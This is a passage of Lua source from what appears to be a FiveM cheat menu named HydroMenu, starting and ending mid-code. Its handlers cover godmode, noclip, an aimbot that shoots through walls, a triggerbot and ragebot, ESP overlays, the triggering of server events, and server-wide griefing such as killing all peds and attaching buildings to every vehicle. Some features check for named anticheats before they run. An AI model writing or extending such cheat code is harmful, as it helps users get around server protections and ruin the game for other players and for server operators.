			elseif HydroMenu.Button("Cancel Auto Pilot") then
				autodriving = false
				ClearPedTasks(PlayerPedId())
			end

			if HydroMenu.menus[HydroMenu.currentMenu].currentOption == 3 then
				if IsDisabledControlJustReleased(0, 175) then
					if HydroVariables.VehicleOptions.AutoPilotOptions.CruiseSpeed < 200.0 then
					    HydroVariables.VehicleOptions.AutoPilotOptions.CruiseSpeed = HydroVariables.VehicleOptions.AutoPilotOptions.CruiseSpeed + 1 
					end
				end
				if IsDisabledControlJustReleased(0, 174) then
					if HydroVariables.VehicleOptions.AutoPilotOptions.CruiseSpeed > 10.0 then
					    HydroVariables.VehicleOptions.AutoPilotOptions.CruiseSpeed = HydroVariables.VehicleOptions.AutoPilotOptions.CruiseSpeed - 1
					end
				end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('vehicleoptions') then
			
			if HydroMenu.MenuButton("Spawn Vehicles", "spawnvehicleoptions") then
			elseif HydroMenu.MenuButton("Open Vehicle Doors", "doorvehicleoptions") then
			elseif HydroMenu.MenuButton("Vehicle Tricks", "vehicletricks") then
			elseif HydroMenu.MenuButton("Hydro Customs", "Hydrocustoms") then
			elseif HydroMenu.MenuButton("Personal Vehicle", "personalvehicle") then
			elseif HydroMenu.MenuButton("Auto Pilot Menu", "vehicleautopilot") then
			elseif HydroMenu.CheckBox("Vehicle Snatcher", VehicleSnatcher) then
				VehicleSnatcher = not VehicleSnatcher
				if VehicleSnatcher then
					FreeCameraMode = "Vehicle Snatcher"
					StartFreeCam(GetGameplayCamFov())
				else
					FreeCameraMode = false
					EndFreeCam()
				end
				
			elseif HydroMenu.Button("Toggle Engine On/Off", "", false, "Turn The Engine On/Off") then
				local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
				if GetIsVehicleEngineRunning(veh) then
					SetVehicleEngineOn(veh, false, true, true)
				else
					SetVehicleEngineOn(veh, true, true, false)
				end
		    elseif HydroMenu.Button("Repair Vehicle", "", false, "Repair All Scratches, Dents & Engine") then

				local veh = GetVehiclePedIsIn(PlayerPedId(), 0)

				SetVehicleEngineHealth(veh, 1000)
				SetVehicleFixed(veh)
			elseif HydroMenu.Button("Freeze / Unfreeze Vehicle") then
				local veh = GetVehiclePedIsIn(PlayerPedId(), 0)

				if IsEntityStatic(veh) then
					FreezeEntityPosition(veh, false)
				else
					FreezeEntityPosition(veh, true)
				end
			elseif HydroMenu.Button("Set Vehicle Upright") then
				
				local veh = GetVehiclePedIsIn(PlayerPedId(), 0)

				SetEntityRotation(veh, 0.0, 0.0, GetEntityHeading(veh))

			elseif HydroMenu.Button("Clean Vehicle") then
				WashDecalsFromVehicle(GetVehiclePedIsUsing(GetPlayerPed(-1)), 1.0)
				SetVehicleDirtLevel(GetVehiclePedIsUsing(GetPlayerPed(-1)))
			elseif HydroMenu.CheckBox("Vehicle Godmode", HydroVariables.VehicleOptions.vehgodmode) then
				
				HydroVariables.VehicleOptions.vehgodmode = not HydroVariables.VehicleOptions.vehgodmode

				if not HydroVariables.VehicleOptions.vehgodmode then
					SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), false)
				end
		
			elseif HydroMenu.CheckBox("Always Clean", HydroVariables.VehicleOptions.AutoClean) then
				HydroVariables.VehicleOptions.AutoClean = not HydroVariables.VehicleOptions.AutoClean
			elseif HydroMenu.CheckBox("Speed Boost On Horn", HydroVariables.VehicleOptions.speedboost, "Haha Car go brrrrr") then
				HydroVariables.VehicleOptions.speedboost = not HydroVariables.VehicleOptions.speedboost
			elseif HydroMenu.CheckBox("Instant Stop", HydroVariables.VehicleOptions.InstantBreaks, "When you break you stop Instantly") then
				HydroVariables.VehicleOptions.InstantBreaks = not HydroVariables.VehicleOptions.InstantBreaks
			elseif HydroMenu.CheckBox("Waterproof", HydroVariables.VehicleOptions.Waterproof) then
				HydroVariables.VehicleOptions.Waterproof = not HydroVariables.VehicleOptions.Waterproof
			elseif HydroMenu.CheckBox("Power Multiplier", HydroVariables.VehicleOptions.activeenignemulr) then
				HydroVariables.VehicleOptions.activeenignemulr = not HydroVariables.VehicleOptions.activeenignemulr

				if not HydroVariables.VehicleOptions.activeenignemulr then
					local vehicle = GetPlayersLastVehicle()
					SetVehicleEnginePowerMultiplier(vehicle, 1.0)
				end

			elseif HydroMenu.ComboBox("Power Multiplier", HydroVariables.VehicleOptions.vehenginemultiplier, HydroVariables.VehicleOptions.curractiveenignemulrIndex, function(currentIndex, selectedIndex)
				
				HydroVariables.VehicleOptions.curractiveenignemulrIndex = currentIndex

				end) then
		
			elseif HydroMenu.CheckBox("Torque Multiplier", HydroVariables.VehicleOptions.activetorquemulr) then

				HydroVariables.VehicleOptions.activetorquemulr = not HydroVariables.VehicleOptions.activetorquemulr
	
				if not HydroVariables.VehicleOptions.activetorquemulr then
					local vehicle = GetPlayersLastVehicle()
					SetVehicleEngineTorqueMultiplier(vehicle, 1.0)
				end

			elseif HydroMenu.ComboBox("Torque Multiplier", HydroVariables.VehicleOptions.vehenginemultiplier, HydroVariables.VehicleOptions.curractivetorqueIndex, function(currentIndex, selectedIndex)
				    HydroVariables.VehicleOptions.curractivetorqueIndex = currentIndex
				end) then

			elseif HydroMenu.UI.RGB and HydroMenu.CheckBox("Rainbow Car", HydroVariables.VehicleOptions.rainbowcar) then
				
				HydroVariables.VehicleOptions.rainbowcar = not HydroVariables.VehicleOptions.rainbowcar

			elseif HydroMenu.CheckBox("Always Wheelie", HydroVariables.VehicleOptions.AlwaysWheelie) then
				HydroVariables.VehicleOptions.AlwaysWheelie = not HydroVariables.VehicleOptions.AlwaysWheelie
			elseif HydroMenu.CheckBox("Easy Handling", HydroVariables.VehicleOptions.EasyHandling) then
					
				HydroVariables.VehicleOptions.EasyHandling = not HydroVariables.VehicleOptions.EasyHandling
				local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
	
				if not HydroVariables.VehicleOptions.EasyHandling then
					SetVehicleGravityAmount(veh, 9.8)
				end
				
			elseif HydroMenu.CheckBox("Drive On Water", HydroVariables.VehicleOptions.DriveOnWater) then
				HydroVariables.VehicleOptions.DriveOnWater = not HydroVariables.VehicleOptions.DriveOnWater
				if HydroVariables.VehicleOptions.DriveOnWaterProp == nil then
					x, y, z = table.unpack(GetEntityCoords(PlayerPedId()))
					HydroVariables.VehicleOptions.DriveOnWaterProp = CreateObject(GetHashKey("ar_prop_ar_bblock_huge_01"), x, y, -90.0, 0, 1, 0)
				elseif not HydroVariables.VehicleOptions.DriveOnWater then
					DeleteEntity(HydroVariables.VehicleOptions.DriveOnWaterProp)
					HydroVariables.VehicleOptions.DriveOnWaterProp = nil
				end
			elseif HydroMenu.CheckBox("Police Headlights", policeheadlights) then

	            policeheadlights = not policeheadlights
				TogPoliceHeadlights()

			elseif HydroMenu.CheckBox("Vehicle Speedometer", HydroVariables.VehicleOptions.speedometer) then
	
				HydroVariables.VehicleOptions.speedometer = not HydroVariables.VehicleOptions.speedometer

			elseif HydroMenu.CheckBox("Force Launch Control", HydroVariables.VehicleOptions.forcelauncontrol) then
				HydroVariables.VehicleOptions.forcelauncontrol = not HydroVariables.VehicleOptions.forcelauncontrol
				if HydroVariables.VehicleOptions.forcelauncontrol then
					SetLaunchControlEnabled(true)
				else
					SetLaunchControlEnabled(false)
				end
			elseif HydroMenu.CheckBox("No Bike Fall", HydroVariables.VehicleOptions.NoBikeFall) then
				HydroVariables.VehicleOptions.NoBikeFall = not HydroVariables.VehicleOptions.NoBikeFall
				SetPedCanBeKnockedOffVehicle(PlayerPedId(), HydroVariables.VehicleOptions.NoBikeFall)
			elseif HydroMenu.CheckBox("Hydro License Plate", HydroVariables.VehicleOptions.Hydroplate) then
				HydroVariables.VehicleOptions.Hydroplate = not HydroVariables.VehicleOptions.Hydroplate
				HydroPlate()
			elseif HydroMenu.Button("Delete Vehicle") then
				DeleteEntity(GetPlayersLastVehicle(PlayerPedId()))
			end

			HydroMenu.Display()

		elseif HydroMenu.IsMenuOpened('visionoptions') then
			if HydroMenu.CheckBox("Thermal Vision", thermalvision) then
				thermalvision = not thermalvision
				if thermalvision then
					SetSeethrough(true)
				else
					SetSeethrough(false)
				end
			elseif HydroMenu.CheckBox("Night Vision", nightvision) then
				nightvision = not nightvision
				if nightvision then
					SetNightvision(true)
				else
					SetNightvision(false)
				end
			elseif HydroMenu.Button("Reset Vision") then
				ClearTimecycleModifier()
				ClearExtraTimecycleModifier()
			elseif HydroMenu.Button("Drunk Vision") then
				SetTimecycleModifier("Drunk")
			elseif HydroMenu.Button("Blue Vision", "") then
				SetExtraTimecycleModifier("LostTimeFlash")
			elseif HydroMenu.Button("Red Player Glow") then
				SetTimecycleModifier("mp_lad_night")
				SetTimecycleModifierStrength(1.2)
			elseif HydroMenu.Button("Yellow Player Glow") then
				SetTimecycleModifier("mp_lad_judgment")
				SetTimecycleModifierStrength(1.2)
			elseif HydroMenu.Button("White Player Glow") then
				SetTimecycleModifier("mp_lad_day")
				SetTimecycleModifierStrength(1.2)
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('selfoptions') then

			if HydroMenu.MenuButton("Set Player Model", "selfmodellist") then
			elseif HydroMenu.MenuButton("Wardrobe", "selfwardrobe") then
			elseif HydroMenu.MenuButton("Super Powers", "superpowers") then
			elseif HydroMenu.MenuButton("Vision Options", "visionoptions") then
			elseif HydroMenu.MenuButton("Trigger Events", 'triggerevents') then
			elseif HydroMenu.MenuButton("Collision Options", "collisionoptions", "Disable Collisions for Some Objects") then
				
		    elseif HydroMenu.CheckBox("Invisible", HydroVariables.SelfOptions.invisiblitity) then
				HydroVariables.SelfOptions.invisiblitity = not HydroVariables.SelfOptions.invisiblitity
				
				if not HydroVariables.SelfOptions.invisiblitity then
					SetEntityVisible(PlayerPedId(), true, true)
				end 
			elseif HydroMenu.CheckBox("Godmode", HydroVariables.SelfOptions.godmode) then
				if SafeMode then
                    SafeModeNotification()
				else
					HydroVariables.SelfOptions.godmode = not HydroVariables.SelfOptions.godmode
					if not HydroVariables.SelfOptions.godmode then
						SetPedCanRagdoll(PlayerPedId(), true)
						ClearPedLastWeaponDamage(PlayerPedId())
						SetEntityProofs(PlayerPedId(), false, false, false, false, false, false, false, false)
						SetEntityOnlyDamagedByPlayer(PlayerPedId(), false)
						SetEntityCanBeDamaged(PlayerPedId(), true)
						SetEntityProofs(PlayerPedId(), false, false, false, false, false, false, false, false)
					end
				end
			elseif HydroMenu.CheckBox("Semi-Godmode", HydroVariables.SelfOptions.AutoHealthRefil) then
				HydroVariables.SelfOptions.AutoHealthRefil = not HydroVariables.SelfOptions.AutoHealthRefil
			elseif HydroMenu.CheckBox("Infinite Stamina", HydroVariables.SelfOptions.infstamina) then
				HydroVariables.SelfOptions.infstamina = not HydroVariables.SelfOptions.infstamina
			elseif HydroMenu.CheckBox("No Ragdoll", HydroVariables.SelfOptions.noragdoll) then

				HydroVariables.SelfOptions.noragdoll = not HydroVariables.SelfOptions.noragdoll

			elseif HydroMenu.CheckBox(GetPlayerWantedLevel(PlayerId()) > 0 and "Freeze Wanted Level" or "Never Wanted", HydroVariables.SelfOptions.FreezeWantedLevel) then
				HydroVariables.SelfOptions.FreezeWantedLevel = not HydroVariables.SelfOptions.FreezeWantedLevel
				HydroVariables.SelfOptions.FrozenWantedLevel = GetPlayerWantedLevel(PlayerId())
			elseif HydroMenu.ValueChanger("Wanted Level", GetPlayerWantedLevel(PlayerId()), 1, {0, 5}, function(val)
				SetPlayerWantedLevel(PlayerId(), val, false)
				SetPlayerWantedLevelNow(PlayerId())
			end) then
			elseif HydroMenu.CheckBox("Player Coords", HydroVariables.SelfOptions.playercoords) then
				HydroVariables.SelfOptions.playercoords = not HydroVariables.SelfOptions.playercoords
			elseif HydroMenu.CheckBox("Force Radar", HydroVariables.SelfOptions.forceradar, "Turn Your radar back on") then
				HydroVariables.SelfOptions.forceradar = not HydroVariables.SelfOptions.forceradar
			elseif HydroMenu.Button("Toggle Noclip") then
				NoClip()
			
	        elseif HydroMenu.ValueChanger("No-clip Speed", NoclipSpeed, 0.1, {0.1, 15}, function(value)
				NoclipSpeed = value
			end, true) then
				
			elseif HydroMenu.Button("Force Revive", "", "Revive Yourself works on most Non-ESX servers") then
				local ped = PlayerPedId()
				local playerPos = GetEntityCoords(ped, true)
				local heading = GetEntityHeading(ped)

				TriggerEvent("PGX:RevivePlayer")
			
				NetworkResurrectLocalPlayer(playerPos, true, true, false)
				SetPlayerInvincible(ped, false)
				ClearPedBloodDamage(ped)
				SetEntityHeading(ped, heading)
				FreezeEntityPosition(ped, false)

			elseif HydroMenu.DynamicTriggers.Triggers['ESXRevive'] ~= nil and HydroMenu.Button("ESX Revive", "", false, "Revive Yourself works on most Non-ESX servers") then
				
				TriggerEvent(HydroMenu.DynamicTriggers.Triggers['ESXRevive'])

			elseif HydroMenu.Button("Suicide") then

				SetEntityHealth(PlayerPedId(), 0)

			elseif HydroMenu.Button("Refill Health") then

				SetEntityHealth(PlayerPedId(), 200)

			elseif HydroMenu.Button("Refill Armour") then

				SetPedArmour(PlayerPedId(), 100)

			elseif HydroMenu.Button("Set Player Wet") then

				SetPedWetnessHeight(PlayerPedId(), 100.0)

			elseif HydroMenu.Button("Set Player Dry") then

				SetPedWetnessHeight(PlayerPedId(), -100.0)

			elseif HydroMenu.Button("Start Fireworks") then

				StartFireworks()
				
			elseif HydroMenu.Button("Freeze / Unfreeze Self") then

				if IsEntityStatic(PlayerPedId()) then
                    FreezeEntityPosition(PlayerPedId(), false)
				else
                    FreezeEntityPosition(PlayerPedId(), true)
				end

			elseif HydroMenu.CheckBox("Wander around", wonderaround) then
				wonderaround = not wonderaround

				if wonderaround then
					TaskWanderStandard(PlayerPedId(), 10.0, 10)	
				else
					ClearPedTasksImmediately(PlayerPedId())
				end
			elseif HydroMenu.Button("Clear Animation") then
                ClearPedTasksImmediately(PlayerPedId())
			
			end
			HydroMenu.Display()
			
		elseif HydroMenu.IsMenuOpened('teleportoptions') then
			if HydroMenu.CheckBox("Smooth Teleport", HydroVariables.TeleportOptions.smoothteleport, "Takes Longer but with a nice transition") then
				HydroVariables.TeleportOptions.smoothteleport = not HydroVariables.TeleportOptions.smoothteleport
			elseif HydroMenu.Button("Teleport To Waypoint") then
				
				local waypoint = GetFirstBlipInfoId(8)

				if DoesBlipExist(waypoint) then
					TeleportToCoords(GetBlipInfoIdCoord(waypoint))
				else
					PushNotification("You have not set a Waypoint", 600)
				end

			elseif HydroMenu.Button('Teleport To Coords') then

				local x = HydroMenu.KeyboardEntry("X Coordinate", 10)
				local y = HydroMenu.KeyboardEntry("Y Coordinate", 10)
				local z = HydroMenu.KeyboardEntry("Z Coordinate", 10)

				x = tonumber(x)
				y = tonumber(y)
				z = tonumber(z)

				SetEntityCoords(PlayerPedId(), x, y, z)

			elseif HydroMenu.Button('Teleport Foward') then

				local ped = PlayerPedId()
				local vehicle = GetPlayersLastVehicle()

				if IsPedInAnyVehicle(ped, true) then
					local coords = GetOffsetFromEntityInWorldCoords(vehicle, 0.0, 2.5, 0)
					local x = coords.x
					local y = coords.y
					local z = coords.z
				    SetEntityCoords(vehicle, x, y, z)
				else
					local coords = GetOffsetFromEntityInWorldCoords(ped, 0.0, 2.5, -1.0)
					local x = coords.x
					local y = coords.y
					local z = coords.z
				    SetEntityCoords(PlayerPedId(), x, y, z)
				end
			end

			if HydroMenu.Button("~c~--------------------- Locations --------------------") then

			end

			for i = 1, #HydroVariables.TeleportOptions.teleportlocations do
				local currLocation = HydroVariables.TeleportOptions.teleportlocations[i]
	
				if HydroMenu.Button(currLocation[1]) then
					local x = currLocation[2]
					local y = currLocation[3]
					local z = currLocation[4]

					TeleportToCoords(x, y, z)
				end
			end
			

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('selectedweaponoptions') then

			local currentWeapon = selectedWeapon

			currentWeapon = currentWeapon:gsub("WEAPON_", "")

			firstletter = currentWeapon:sub(1, 1)

			firstletter = string.upper(firstletter)

			currentWeapon = currentWeapon:sub(2)

			local weapo = firstletter .. string.upper(currentWeapon)

			HydroMenu.SetMenuProperty('selectedweaponoptions', 'subTitle', weapo)
			
			equporrem = ""

			if not HasPedGotWeapon(PlayerPedId(), GetHashKey(selectedWeapon), false) then
				equporrem = "Equip"
			else
				equporrem = "Remove"
			end

			if HydroMenu.Button(equporrem) then
				if HasPedGotWeapon(PlayerPedId(), GetHashKey(selectedWeapon), false) then
				    RemoveWeaponFromPed(PlayerPedId(), GetHashKey(selectedWeapon))
			    else
				    GiveWeaponToPed(PlayerPedId(), GetHashKey(selectedWeapon), 9999, false, false)
				end
			elseif HydroMenu.Button("Refill Ammo") then
				SetAmmoInClip(PlayerPedId(), GetHashKey(selectedWeapon), 9999)
				SetPedAmmo(PlayerPedId(), GetHashKey(selectedWeapon), 9999)
			end
			
			for i = 1, #globalAttachmentTable do

				if DoesWeaponTakeWeaponComponent(GetHashKey(selectedWeapon), GetHashKey(globalAttachmentTable[i][1])) then
					if HydroMenu.Button(globalAttachmentTable[i][2]) then
						if HasPedGotWeaponComponent(PlayerPedId(), GetHashKey(selectedWeapon), globalAttachmentTable[i][1]) then
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetHashKey(selectedWeapon), globalAttachmentTable[i][1])
						else
						    GiveWeaponComponentToPed(PlayerPedId(), GetHashKey(selectedWeapon), globalAttachmentTable[i][1])
						end
				    end
			    end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('weaponslist') then

			for i = 1, #allWeapons do
				local currentWeapon = allWeapons[i]
	
				currentWeapon = currentWeapon:gsub("WEAPON_", "")

				firstletter = currentWeapon:sub(1, 1)

				firstletter = string.upper(firstletter)

				currentWeapon = currentWeapon:sub(2)

				currentWeapon = string.lower(currentWeapon)

				if string.find(currentWeapon, "_") then
					currentWeapon = currentWeapon:gsub("_", " ")
				end

				if string.find(currentWeapon, "50") then
					currentWeapon = currentWeapon:gsub("50", " 50")
				end

				if string.find(currentWeapon, "mk") then
					currentWeapon = currentWeapon:gsub("mk", " MK")
				end

				if firstletter .. string.lower(currentWeapon) ~= "Unarmed" then
					if not string.find(currentWeapon, "adget") then
						if HydroMenu.MenuButton(firstletter .. currentWeapon, "selectedweaponoptions") then
							selectedWeapon = allWeapons[i] 
						end
					end
				end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('bulletoptions') then
			
			if HydroMenu.CheckBox("Bullet Replace", HydroVariables.WeaponOptions.BulletOptions.Enabled) then
				HydroVariables.WeaponOptions.BulletOptions.Enabled = not HydroVariables.WeaponOptions.BulletOptions.Enabled
			elseif HydroMenu.ComboBox("Bullet Type", HydroVariables.WeaponOptions.BulletOptions.Bullets, HydroVariables.WeaponOptions.BulletOptions.CurrentBullet, function(currentIndex)
				HydroVariables.WeaponOptions.BulletOptions.CurrentBullet = currentIndex
				if HydroVariables.WeaponOptions.BulletOptions.CurrentBullet == 1 then
					HydroVariables.WeaponOptions.BulletOptions.WeaponBulletName = "WEAPON_REVOLVER"
				elseif HydroVariables.WeaponOptions.BulletOptions.CurrentBullet == 2 then
					HydroVariables.WeaponOptions.BulletOptions.WeaponBulletName = "WEAPON_HEAVYSNIPER"
				elseif HydroVariables.WeaponOptions.BulletOptions.CurrentBullet == 3 then
					HydroVariables.WeaponOptions.BulletOptions.WeaponBulletName = "WEAPON_RPG"
				elseif HydroVariables.WeaponOptions.BulletOptions.CurrentBullet == 4 then
					HydroVariables.WeaponOptions.BulletOptions.WeaponBulletName = "WEAPON_FIREWORK"
				elseif HydroVariables.WeaponOptions.BulletOptions.CurrentBullet == 5 then
					HydroVariables.WeaponOptions.BulletOptions.WeaponBulletName = "WEAPON_RAYPISTOL"
				end
			end) then
			end
			
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('weaponaimbotsettings') then
			if HydroMenu.CheckBox("Aimbot", HydroVariables.WeaponOptions.AimBot.Enabled) then
				HydroVariables.WeaponOptions.AimBot.Enabled = not HydroVariables.WeaponOptions.AimBot.Enabled
				if not HydroVariables.WeaponOptions.AimBot.Enabled then
					SetPedShootsAtCoord(PlayerPedId(), 0.0, 0.0, 0.0, false)
				end
			elseif HydroMenu.CheckBox("Through Walls", HydroVariables.WeaponOptions.AimBot.ThroughWalls) then
				HydroVariables.WeaponOptions.AimBot.ThroughWalls = not HydroVariables.WeaponOptions.AimBot.ThroughWalls
			elseif HydroMenu.CheckBox("Draw FOV", HydroVariables.WeaponOptions.AimBot.DrawFOV) then
				HydroVariables.WeaponOptions.AimBot.DrawFOV = not HydroVariables.WeaponOptions.AimBot.DrawFOV
			elseif HydroMenu.CheckBox("Show Target", HydroVariables.WeaponOptions.AimBot.ShowTarget) then
				HydroVariables.WeaponOptions.AimBot.ShowTarget = not HydroVariables.WeaponOptions.AimBot.ShowTarget
			elseif HydroMenu.ValueChanger("FOV", HydroVariables.WeaponOptions.AimBot.FOV, 0.01, {0.02, 1}, function(val)
				HydroVariables.WeaponOptions.AimBot.FOV = val
			end, true) then
			elseif HydroMenu.ValueChanger("Distance", HydroVariables.WeaponOptions.AimBot.Distance, 1, {1, 1000}, function(val)
				HydroVariables.WeaponOptions.AimBot.Distance = val
			end, true) then
			elseif HydroMenu.ValueChanger("Hit Chance", HydroVariables.WeaponOptions.AimBot.HitChance, 1, {0, 100}, function(val)
				HydroVariables.WeaponOptions.AimBot.HitChance = val
			end, true) then
			elseif HydroMenu.ComboBox("Bone", HydroVariables.WeaponOptions.AimBot.ComboBox.IndexItems, HydroVariables.WeaponOptions.AimBot.ComboBox.CurIndex, function(currentIndex, selectedIndex)
				HydroVariables.WeaponOptions.AimBot.ComboBox.CurIndex = currentIndex
				HydroVariables.WeaponOptions.AimBot.ComboBox.SelIndex = selectedIndex
				end) then

				if HydroVariables.WeaponOptions.AimBot.ComboBox.CurIndex == 1 then
					HydroVariables.WeaponOptions.AimBot.Bone = "SKEL_HEAD"
				elseif HydroVariables.WeaponOptions.AimBot.ComboBox.CurIndex == 2 then
					HydroVariables.WeaponOptions.AimBot.Bone = "SKEL_ROOT"
				elseif HydroVariables.WeaponOptions.AimBot.ComboBox.CurIndex == 3 then
					HydroVariables.WeaponOptions.AimBot.Bone = "SKEL_PELVIS"
				end

			elseif HydroMenu.CheckBox("Only Target Players", HydroVariables.WeaponOptions.AimBot.OnlyPlayers) then
				HydroVariables.WeaponOptions.AimBot.OnlyPlayers = not HydroVariables.WeaponOptions.AimBot.OnlyPlayers
			elseif HydroMenu.CheckBox("Ignore Friends", HydroVariables.WeaponOptions.AimBot.IgnoreFriends) then
				HydroVariables.WeaponOptions.AimBot.IgnoreFriends = not HydroVariables.WeaponOptions.AimBot.IgnoreFriends
			elseif HydroMenu.CheckBox("Visibility Check", HydroVariables.WeaponOptions.AimBot.InvisibilityCheck, "Only Visible Peds/Players") then
				HydroVariables.WeaponOptions.AimBot.InvisibilityCheck = not HydroVariables.WeaponOptions.AimBot.InvisibilityCheck
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('weaponoptions') then

			if HydroMenu.MenuButton("Weapon List", 'weaponslist') then
			elseif HydroMenu.MenuButton("Aimbot", 'weaponaimbotsettings') then
			elseif HydroMenu.MenuButton("Bullet Options", 'bulletoptions') then
			elseif HydroMenu.Button("Get All Weapons") then
				for i = 1, #allWeapons do
				    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(allWeapons[i]), 9999, false, false)
				end
			elseif HydroMenu.Button("Remove All Weapons") then
				RemoveAllPedWeapons(PlayerPedId(), false)
			elseif HydroMenu.Button("Refill All Ammo") then
				for i = 1, #allWeapons do
					SetAmmoInClip(PlayerPedId(), GetHashKey(allWeapons[i]), 9999)
					SetPedAmmo(PlayerPedId(), GetHashKey(allWeapons[i]), 9999)
				end
            elseif HydroMenu.CheckBox("Infinite Ammo", HydroVariables.WeaponOptions.InfAmmo) then
				HydroVariables.WeaponOptions.InfAmmo = not HydroVariables.WeaponOptions.InfAmmo
            elseif HydroMenu.CheckBox("No Reload", HydroVariables.WeaponOptions.NoReload) then
				HydroVariables.WeaponOptions.NoReload = not HydroVariables.WeaponOptions.NoReload
			elseif HydroMenu.CheckBox("Ragebot", HydroVariables.WeaponOptions.RageBot) then
                HydroVariables.WeaponOptions.RageBot = not HydroVariables.WeaponOptions.RageBot
			elseif HydroMenu.CheckBox("Spinbot", HydroVariables.WeaponOptions.Spinbot) then
				HydroVariables.WeaponOptions.Spinbot = not HydroVariables.WeaponOptions.Spinbot
            elseif HydroMenu.CheckBox("Rapid Fire", HydroVariables.WeaponOptions.RapidFire) then
				HydroVariables.WeaponOptions.RapidFire = not HydroVariables.WeaponOptions.RapidFire
			elseif HydroMenu.CheckBox("Trigger Bot", HydroVariables.WeaponOptions.TriggerBot) then
				HydroVariables.WeaponOptions.TriggerBot = not HydroVariables.WeaponOptions.TriggerBot
            elseif HydroMenu.CheckBox("Crosshair", HydroVariables.WeaponOptions.Crosshair) then
				HydroVariables.WeaponOptions.Crosshair = not HydroVariables.WeaponOptions.Crosshair
            elseif HydroMenu.CheckBox("Bullet Tracers", HydroVariables.WeaponOptions.Tracers) then
				HydroVariables.WeaponOptions.Tracers = not HydroVariables.WeaponOptions.Tracers
				if not HydroVariables.WeaponOptions.Tracers then
					BulletCoords = {}
				end
            elseif HydroMenu.CheckBox("No Recoil", HydroVariables.WeaponOptions.NoRecoil) then
				HydroVariables.WeaponOptions.NoRecoil = not HydroVariables.WeaponOptions.NoRecoil
			elseif HydroMenu.CheckBox("Force Mod", HydroVariables.WeaponOptions.MagnetoMode) then
				HydroVariables.WeaponOptions.MagnetoMode = not HydroVariables.WeaponOptions.MagnetoMode
				ForceMod(HydroVariables.WeaponOptions.MagnetoMode)
			elseif HydroMenu.CheckBox("Explosive Ammo", HydroVariables.WeaponOptions.ExplosiveAmmo) then
				if AntiCheats.WaveSheild or AntiCheats.BadgerAC or AntiCheats.TigoAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				elseif SafeMode then  
					SafeModeNotification()
				else
				    HydroVariables.WeaponOptions.ExplosiveAmmo = not HydroVariables.WeaponOptions.ExplosiveAmmo
				end
			elseif HydroMenu.CheckBox("Del Gun", HydroVariables.WeaponOptions.DelGun) then
				HydroVariables.WeaponOptions.DelGun = not HydroVariables.WeaponOptions.DelGun
			elseif HydroMenu.CheckBox("One Shot", HydroVariables.WeaponOptions.OneShot) then
				if SafeMode then
                    SafeModeNotification()
				else
					HydroVariables.WeaponOptions.OneShot = not HydroVariables.WeaponOptions.OneShot
				end
			end

			HydroMenu.Display()

		elseif HydroMenu.IsMenuOpened('espoptions') then

			if HydroMenu.CheckBox("ESP RGB Sync", HydroVariables.MiscOptions.ESPMenuColours) then
				HydroVariables.MiscOptions.ESPMenuColours = not HydroVariables.MiscOptions.ESPMenuColours
			elseif HydroMenu.ValueChanger("ESP Distance", HydroVariables.MiscOptions.ESPDistance, 1, {100, 5000}, function(val)
				HydroVariables.MiscOptions.ESPDistance = val
			end, true) then
			elseif HydroMenu.CheckBox("ESP Lines", HydroVariables.MiscOptions.ESPLines) then
				HydroVariables.MiscOptions.ESPLines = not HydroVariables.MiscOptions.ESPLines 
			--[[
			elseif HydroMenu.CheckBox("ESP Player Bones", HydroVariables.MiscOptions.ESPBones) then
				HydroVariables.MiscOptions.ESPBones = not HydroVariables.MiscOptions.ESPBones 
				if not HydroVariables.MiscOptions.ESPBones then
					local playerlist = GetActivePlayers()
					for i = 1, #playerlist do
						local curplayer = playerlist[i]
						local curplayerped = GetPlayerPed(curplayer)
		
						ResetEntityAlpha(curplayerped)
					end
				end
			]]

			elseif HydroMenu.CheckBox("ESP Boxes", HydroVariables.MiscOptions.ESPBox) then
				HydroVariables.MiscOptions.ESPBox = not HydroVariables.MiscOptions.ESPBox 
			elseif HydroMenu.CheckBox("ESP Blips", HydroVariables.MiscOptions.ESPBlips) then
				HydroVariables.MiscOptions.ESPBlips = not HydroVariables.MiscOptions.ESPBlips 
				PlayerBlips()
			elseif HydroMenu.CheckBox("ESP Player Info", HydroVariables.MiscOptions.ESPName) then
				HydroVariables.MiscOptions.ESPName = not HydroVariables.MiscOptions.ESPName 
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('serveroptions') then

			if HydroMenu.Button("Server IP: " ..GetCurrentServerEndpoint()) then
			elseif HydroMenu.CheckBox("GLife Method", HydroVariables.MiscOptions.GlifeHack) then
				HydroVariables.MiscOptions.GlifeHack = not HydroVariables.MiscOptions.GlifeHack
			elseif HydroMenu.CheckBox("Make All Vehicles Fly", HydroVariables.MiscOptions.FlyingCars) then
				HydroVariables.MiscOptions.FlyingCars = not HydroVariables.MiscOptions.FlyingCars
			elseif HydroMenu.Button("Teleport All Peds 100ft above Self") then
				for ped in EnumeratePeds() do
					if IsPedAPlayer(ped) ~= true and ped ~= PlayerPedId() then
						RequestControlOnce(ped)
						SetPedToRagdoll(ped, 4000, 5000, 0, true, true, true)
						local x, y, z = table.unpack(GetEntityCoords(PlayerPedId()))
						SetEntityCoords(ped, x, y, z + 100.0)
					end
				end
			elseif HydroMenu.Button("Kill All Peds") then
				for ped in EnumeratePeds() do
					if IsPedAPlayer(ped) ~= true and ped ~= PlayerPedId() then
						RequestControlOnce(ped)
						SetEntityHealth(ped, 0)
					end
				end
			elseif HydroMenu.Button("Ramp All Vehicles") then
				RampAllCars()
			elseif HydroMenu.Button("FIB Building All Vehicles") then
				for vehicle in EnumerateVehicles() do
					local building = CreateObject(-1404869155, 0, 0, 0, true, true, true)
					NetworkRequestControlOfEntity(vehicle)
					if DoesEntityExist(vehicle) then
						AttachEntityToEntity(building, vehicle, 0, 0, 0.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					end
